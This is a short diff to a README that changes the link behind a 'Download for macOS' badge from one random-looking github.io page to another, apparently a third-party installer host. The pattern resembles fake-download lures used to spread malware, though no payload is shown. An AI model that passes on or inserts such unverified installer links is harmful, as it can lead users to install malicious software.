@@ -72,7 +72,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://Cascadegliline.github.io/mac-runner/)
 
 </div>
 
